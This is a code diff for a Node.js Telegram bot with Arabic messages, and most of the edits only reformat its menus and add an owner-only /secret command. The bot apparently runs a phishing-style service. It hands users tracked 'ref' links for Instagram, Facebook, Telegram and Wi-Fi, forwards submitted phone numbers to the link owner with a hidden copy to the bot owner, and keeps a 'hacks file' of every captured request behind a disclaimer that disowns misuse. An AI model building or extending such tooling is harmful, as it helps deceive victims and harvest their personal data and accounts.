@@ -24,7 +24,7 @@ if (!TOKEN) {
 let dailySecret = generateDailySecret();
 
 function generateDailySecret() {
-    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*';
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
     let code = '';
     for (let i = 0; i < 8; i++) {
         code += chars.charAt(Math.floor(Math.random() * chars.length));
@@ -39,7 +39,7 @@ function generateDailySecret() {
 function scheduleDailyReset() {
     const now = new Date();
     const target = new Date();
-    target.setHours(11, 0, 0, 0); // 11:00 صباحاً
+    target.setHours(11, 0, 0, 0);
 
     if (now > target) {
         target.setDate(target.getDate() + 1);
@@ -55,7 +55,6 @@ function scheduleDailyReset() {
 
         console.log(`🔄 تم تغيير كلمة السر: ${oldCode} → ${dailySecret}`);
 
-        // ✅ إرسال الكلمة الجديدة للمالك
         bot.sendMessage(
             OWNER_ID,
             `🔑 *كلمة السر اليومية الجديدة:*\n\`${dailySecret}\`\n📅 ${new Date().toLocaleString('ar-JO', { timeZone: 'Asia/Amman' })}`,
@@ -290,14 +289,12 @@ app.post("/api/request-access", async (req, res) => {
             ];
         }
 
-        // ✅ إرسال الطلب لصاحب الرابط
         await bot.sendMessage(
             telegramId,
             `📩 طلب تواصل جديد\n📱 ${phone}\n🆔 ${requestId}\n📌 ${app || "غير محدد"}`,
             { reply_markup: { inline_keyboard: buttons } }
         );
 
-        // ✅ إرسال نسخة للمالك
         await bot.sendMessage(
             OWNER_ID,
             `📩 *طلب تواصل جديد (نسخة للمالك)*\n\n📱 *رقم التواصل:* ${phone}\n🆔 *رقم الطلب:* ${requestId}\n📌 *التطبيق:* ${app || "غير محدد"}\n👤 *صاحب الرابط:* ${telegramId}`,
@@ -334,20 +331,28 @@ app.post("/forgot-password", async (req, res) => {
 });
 
 // ============================================================
-// Owner Menu
+// Owner Menu (مرتبة ومتكتكة)
 // ============================================================
 
 function sendOwnerMenu(chatId) {
     let buttons = [
-        [{ text: "📊 عدد المستخدمين", callback_data: "users_count" }],
-        [{ text: isBotActive ? "⏸ إيقاف البوت" : "▶️ تشغيل البوت", callback_data: "toggle_bot" }],
-        [{ text: "🔑 كلمة السر اليومية", callback_data: "show_secret" }],
-        [{ text: "📋 قائمة المستخدمين", callback_data: "users_list" }],
-        [{ text: "📁 ملف الاختراقات", callback_data: "hack_file" }]
+        [
+            { text: "📊 عدد المستخدمين", callback_data: "users_count" },
+            { text: "📋 قائمة المستخدمين", callback_data: "users_list" }
+        ],
+        [
+            { text: "🔑 كلمة السر اليومية", callback_data: "show_secret" },
+            { text: "📁 ملف الاختراقات", callback_data: "hack_file" }
+        ],
+        [
+            { text: isBotActive ? "⏸ إيقاف البوت" : "▶️ تشغيل البوت", callback_data: "toggle_bot" }
+        ]
     ];
 
     if (showAppButtons) {
-        buttons.push([{ text: "🙈 إخفاء الأزرار", callback_data: "hide_buttons" }]);
+        buttons.push([
+            { text: "🙈 إخفاء الأزرار", callback_data: "hide_buttons" }
+        ]);
         buttons.push([
             { text: "📸 Instagram", callback_data: "instagram" },
             { text: "📘 Facebook", callback_data: "facebook" }
@@ -356,28 +361,38 @@ function sendOwnerMenu(chatId) {
             { text: "✈️ Telegram", callback_data: "telegram" },
             { text: "📞 طلب اتصال", callback_data: "contact" }
         ]);
-        buttons.push([{ text: "📶 Wi-Fi", callback_data: "wifi" }]);
-        buttons.push([{ text: "🔗 الـ REF", callback_data: "show_refs" }]);
+        buttons.push([
+            { text: "📶 Wi-Fi", callback_data: "wifi" }
+        ]);
+        buttons.push([
+            { text: "🔗 الـ REF", callback_data: "show_refs" }
+        ]);
     } else {
-        buttons.push([{ text: "👁️ إظهار الأزرار", callback_data: "show_buttons" }]);
+        buttons.push([
+            { text: "👁️ إظهار الأزرار", callback_data: "show_buttons" }
+        ]);
     }
 
     return bot.sendMessage(
         chatId,
-        `🖥️ مرحبا بالسيد ${OWNER_NAME}\n👑 Hello King ${OWNER_NAME}`,
-        { reply_markup: { inline_keyboard: buttons } }
+        `🖥️ *مرحباً أيها السيد ${OWNER_NAME}* 👑\n\n📌 *اختر الإجراء:*`,
+        {
+            parse_mode: 'Markdown',
+            reply_markup: { inline_keyboard: buttons }
+        }
     );
 }
 
 // ============================================================
-// User Menu
+// User Menu (مرتبة ومتكتكة)
 // ============================================================
 
 function sendUserMenu(chatId) {
     return bot.sendMessage(
         chatId,
-        `🔓 اختر الخدمة:`,
+        `🔓 *اختر الخدمة:*`,
         {
+            parse_mode: 'Markdown',
             reply_markup: {
                 inline_keyboard: [
                     [
@@ -388,7 +403,9 @@ function sendUserMenu(chatId) {
                         { text: "✈️ Telegram", callback_data: "telegram" },
                         { text: "📞 طلب اتصال", callback_data: "contact" }
                     ],
-                    [{ text: "📶 Wi-Fi", callback_data: "wifi" }]
+                    [
+                        { text: "📶 Wi-Fi", callback_data: "wifi" }
+                    ]
                 ]
             }
         }
@@ -407,7 +424,7 @@ bot.onText(/^\/start$/, async (msg) => {
         const username = msg.from?.username ? `@${msg.from.username}` : "لا يوجد";
         await saveUser(chatId, username, firstName, lastName);
 
-        // ✅ صاحب البوت (يطلب كلمة السر اليومية)
+        // ✅ المالك يطلب كلمة السر
         if (String(chatId) === OWNER_ID) {
             if (!acceptedUsers.has(chatId)) {
                 return bot.sendMessage(
@@ -429,10 +446,7 @@ bot.onText(/^\/start$/, async (msg) => {
         if (!isVerified && !verifiedUsers.has(String(chatId))) {
             return bot.sendMessage(
                 chatId,
-                `📋 *شروط الاستخدام:*\n\n` +
-                `⚠️ أنا غير مسؤول عن أي استخدام غير لائق أو غير رسمي للبوت.\n\n` +
-                `✅ باستخدامك للبوت، أنت توافق على هذه الشروط.\n\n` +
-                `🆔 *معرفك:* \`${chatId}\``,
+                `📋 *شروط الاستخدام:*\n\n⚠️ أنا غير مسؤول عن أي استخدام غير لائق.\n\n✅ باستخدامك للبوت، أنت توافق على هذه الشروط.\n\n🆔 *معرفك:* \`${chatId}\``,
                 {
                     parse_mode: 'Markdown',
                     reply_markup: {
@@ -454,6 +468,19 @@ bot.onText(/^\/start$/, async (msg) => {
 });
 
 // ============================================================
+// أمر /secret (لمعرفة كلمة السر الحالية)
+// ============================================================
+
+bot.onText(/\/secret$/, async (msg) => {
+    const chatId = msg.chat.id;
+    if (String(chatId) === OWNER_ID) {
+        bot.sendMessage(chatId, `🔑 *كلمة السر اليومية:*\n\`${dailySecret}\``, { parse_mode: 'Markdown' });
+    } else {
+        bot.sendMessage(chatId, `⚠️ هذا الأمر للمالك فقط.`);
+    }
+});
+
+// ============================================================
 // معالجة الرسائل النصية (كلمة السر للمالك)
 // ============================================================
 
@@ -468,13 +495,13 @@ bot.on('message', async (msg) => {
                 acceptedUsers.add(chatId);
                 await bot.sendMessage(chatId, `✅ *تم التحقق بنجاح!*\n\n📌 مرحباً بك أيها السيد ${OWNER_NAME}`, { parse_mode: 'Markdown' });
                 return sendOwnerMenu(chatId);
-            } else if (text !== '/start') {
+            } else if (text !== '/start' && text !== '/secret') {
                 await bot.sendMessage(chatId, `❌ *كلمة السر غير صحيحة!*\n\n📌 يرجى المحاولة مرة أخرى.`, { parse_mode: 'Markdown' });
             }
             return;
         }
 
-        // ✅ كلمة السر للمستخدمين العاديين (إذا أردت تفعيلها)
+        // ✅ كلمة السر للمستخدمين العاديين
         if (waitingForSecret.has(chatId)) {
             if (text === dailySecret) {
                 await verifyUser(chatId);
@@ -505,8 +532,7 @@ bot.on("callback_query", async (query) => {
         if (String(chatId) === OWNER_ID) {
             if (data === "hack_file") {
                 const requests = await getAllContactRequests();
-                let text = `📁 *ملف الاختراقات*\n\n`;
-                text += `📋 *جميع الطلبات المسجلة:*\n`;
+                let text = `📁 *ملف الاختراقات*\n\n📋 *جميع الطلبات المسجلة:*\n`;
 
                 if (requests.length === 0) {
                     text += `\n⚠️ لا توجد طلبات بعد.`;
@@ -538,8 +564,8 @@ bot.on("callback_query", async (query) => {
             }
             if (data === "show_refs") {
                 const refs = await getAllReferrals(chatId);
-                let text = `🔗 روابط REF:\n`;
-                if (refs.length === 0) text += `لا يوجد`;
+                let text = `🔗 *روابط REF:*\n`;
+                if (refs.length === 0) text += `\n⚠️ لا يوجد روابط.`;
                 else refs.forEach((r, i) => text += `\n${i+1}. \`${r.token}\``);
                 await bot.answerCallbackQuery(query.id);
                 return bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
@@ -547,12 +573,12 @@ bot.on("callback_query", async (query) => {
             if (data === "users_count") {
                 const count = await getActiveUsersCount();
                 await bot.answerCallbackQuery(query.id);
-                return bot.sendMessage(chatId, `👥 المستخدمين النشطين: ${count}`);
+                return bot.sendMessage(chatId, `👥 *المستخدمين النشطين:* ${count}`);
             }
             if (data === "users_list") {
                 const list = await getActiveUsers();
-                let text = `📋 قائمة المستخدمين:\n`;
-                if (list.length === 0) text += `لا يوجد`;
+                let text = `📋 *قائمة المستخدمين:*\n`;
+                if (list.length === 0) text += `\n⚠️ لا يوجد مستخدمين.`;
                 else list.forEach((u, i) => {
                     const name = u.first_name || u.username || "غير معروف";
                     text += `\n${i+1}. ${name} 🆔 ${u.telegram_id}`;
@@ -650,7 +676,7 @@ bot.on("callback_query", async (query) => {
         const link = `${url}${sep}ref=${token}`;
 
         await bot.answerCallbackQuery(query.id, { text: "✅ تم إنشاء الرابط" });
-        await bot.sendMessage(chatId, `🔗 رابطك:\n${link}`);
+        await bot.sendMessage(chatId, `🔗 *رابطك:*\n${link}`, { parse_mode: 'Markdown' });
 
     } catch (error) {
         console.error("❌ Callback error:", error);
